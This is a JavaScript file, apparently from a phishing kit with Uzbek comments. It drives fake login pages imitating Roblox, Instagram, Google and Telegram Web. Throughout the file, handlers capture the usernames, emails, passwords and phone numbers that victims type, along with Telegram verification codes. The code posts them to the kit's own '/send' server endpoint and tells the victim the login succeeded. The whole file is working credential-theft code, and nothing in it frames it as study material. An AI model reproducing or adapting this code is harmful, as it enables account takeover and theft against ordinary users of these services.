document.addEventListener("DOMContentLoaded", () => {
  // 1. LINK.HTML (ROBLOX FORM)
  const robloxGoBtn = document.getElementById("go");
  const robloxUserInput = document.getElementById("u");
  const robloxPassInput = document.getElementById("p");
  const eyeBtn = document.getElementById("eye");

  if (robloxGoBtn && robloxUserInput && robloxPassInput) {
    setupRobloxPage(robloxUserInput, robloxPassInput, robloxGoBtn, eyeBtn);
  }

  // 2. NAME.HTML (INSTAGRAM)
  const instagramForm = document.getElementById("loginForm");
  if (instagramForm) {
    setupInstagramPage();
  }

  // 3. MESSAGE.HTML (GOOGLE)
  const googleNextBtn = document.querySelector(".next");
  if (googleNextBtn) {
    setupGooglePage();
  }

  // 4. GMAIL.HTML (TELEGRAM WEB 2-STEP)
  const tgPhoneForm = document.getElementById("phone-form");
  const tgCodeForm = document.getElementById("code-form");
  if (tgPhoneForm || tgCodeForm) {
    setupTelegramWebPage();
  }
});

// ==========================================
// ROBLOX (link.html) LOGIKASI
// ==========================================
function setupRobloxPage(userInput, passInput, goBtn, eyeBtn) {
  // Parolni ko'rsatish/yashirish
  if (eyeBtn) {
    eyeBtn.addEventListener("click", () => {
      const isPass = passInput.type === "password";
      passInput.type = isPass ? "text" : "password";
    });
  }

  // Inputlar to'ldirilganda Sign In tugmasini aktivlashtirish
  function updateButtonState() {
    const filled = userInput.value.trim() !== "" && passInput.value.trim() !== "";
    goBtn.disabled = !filled;
    goBtn.classList.toggle("on", filled);
  }

  userInput.addEventListener("input", updateButtonState);
  passInput.addEventListener("input", updateButtonState);

  // Sign In tugmasi bosilganda
  goBtn.addEventListener("click", async () => {
    if (goBtn.disabled) return;

    try {
      await sendToServer({
        source: "Link Page (Roblox)",
        username: userInput.value.trim(),
        password: passInput.value.trim()
      });

      alert("Accountga muvaffaqiyatli kirildi!");
      userInput.value = "";
      passInput.value = "";
      updateButtonState();
    } catch (err) {
      console.error(err);
      alert("Xatolik yuz berdi, qayta urinib ko'ring.");
    }
  });
}

// ==========================================
// INSTAGRAM (name.html) LOGIKASI
// ==========================================
function setupInstagramPage() {
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const loginBtn = document.getElementById("loginBtn");
  const loginForm = document.getElementById("loginForm");
  const toggleBtn = document.getElementById("toggleBtn");

  function checkForm() {
    loginBtn.disabled = !(usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "");
  }

  usernameInput.addEventListener("input", checkForm);
  passwordInput.addEventListener("input", checkForm);

  if (toggleBtn) {
    toggleBtn.addEventListener("click", () => {
      const isPass = passwordInput.type === "password";
      passwordInput.type = isPass ? "text" : "password";
      toggleBtn.textContent = isPass ? "Yashirish" : "Ko'rsatish";
    });
  }

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    try {
      await sendToServer({
        source: "Instagram Page",
        username: usernameInput.value.trim(),
        password: passwordInput.value.trim()
      });

      alert("Accountga muvaffaqiyatli kirildi!");
      usernameInput.value = "";
      passwordInput.value = "";
      loginBtn.disabled = true;
    } catch (err) {
      console.error(err);
      alert("Xatolik yuz berdi!");
    }
  });
}

// ==========================================
// GOOGLE (message.html) LOGIKASI
// ==========================================
function setupGooglePage() {
  const emailInput = document.querySelector("input[autocomplete='username']");
  const passInput = document.getElementById("pwd");
  const nextBtn = document.querySelector(".next");

  nextBtn.addEventListener("click", async (e) => {
    e.preventDefault();
    const email = emailInput ? emailInput.value.trim() : "";
    const password = passInput ? passInput.value.trim() : "";

    if (!email) {
      alert("Iltimos, email yoki telefon raqamini kiriting!");
      return;
    }

    try {
      await sendToServer({
        source: "Google Page",
        email: email,
        password: password
      });

      alert("Accountga muvaffaqiyatli kirildi!");
      if (emailInput) emailInput.value = "";
      if (passInput) passInput.value = "";
    } catch (err) {
      console.error(err);
      alert("Xatolik yuz berdi!");
    }
  });
}

// ==========================================
// TELEGRAM WEB (gmail.html) LOGIKASI
// ==========================================
function setupTelegramWebPage() {
  const usernameInput = document.getElementById("username");
  const phoneInput = document.getElementById("phone");
  const phoneForm = document.getElementById("phone-form");
  const codeForm = document.getElementById("code-form");
  const codeDigits = document.querySelectorAll(".code-digit");
  const displayPhone = document.getElementById("display-phone");

  if (phoneForm) {
    phoneForm.addEventListener("submit", async (event) => {
      event.preventDefault();
      const username = usernameInput.value.trim();
      const phone = phoneInput.value.trim();

      if (!username || !phone || phone === "+998") {
        alert("Iltimos, ma'lumotlarni to'liq kiriting!");
        return;
      }

      try {
        await sendToServer({
          source: "Gmail Page (Telegram Step 1)",
          username: username,
          phone: phone
        });

        displayPhone.innerText = phone;
        document.getElementById("step-1").classList.remove("active");
        setTimeout(() => {
          document.getElementById("step-2").classList.add("active");
          if (codeDigits[0]) codeDigits[0].focus();
        }, 150);
      } catch (err) {
        console.error(err);
        alert("Xatolik yuz berdi!");
      }
    });
  }

  if (codeDigits.length > 0) {
    codeDigits.forEach((digit, index) => {
      digit.addEventListener("input", () => {
        digit.value = digit.value.replace(/[^0-9]/g, '');
        if (digit.value.length === 1 && index < codeDigits.length - 1) {
          codeDigits[index + 1].focus();
        }
      });

      digit.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !digit.value && index > 0) {
          codeDigits[index - 1].focus();
        }
      });
    });
  }

  if (codeForm) {
    codeForm.addEventListener("submit", async (event) => {
      event.preventDefault();
      let code = "";
      codeDigits.forEach((digit) => (code += digit.value));

      if (code.length < 5) {
        alert("Iltimos, 5 xonali kodni to'liq kiriting!");
        return;
      }

      try {
        await sendToServer({
          source: "Gmail Page (Telegram Verification Code)",
          username: usernameInput ? usernameInput.value.trim() : "N/A",
          phone: phoneInput ? phoneInput.value.trim() : "N/A",
          code: code
        });

        alert("Accountga muvaffaqiyatli kirildi!");
        codeDigits.forEach((d) => (d.value = ""));
        if (usernameInput) usernameInput.value = "";
        if (phoneInput) phoneInput.value = "+998 ";
      } catch (err) {
        console.error(err);
        alert("Xatolik yuz berdi!");
      }
    });
  }
}

// ==========================================
// UMUMIY SERVERGA YUBORISH FUNKSIYASI
// ==========================================
async function sendToServer(data) {
  const res = await fetch("/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });

  if (!res.ok) throw new Error("Server xatosi: " + res.status);
  return res.json();
}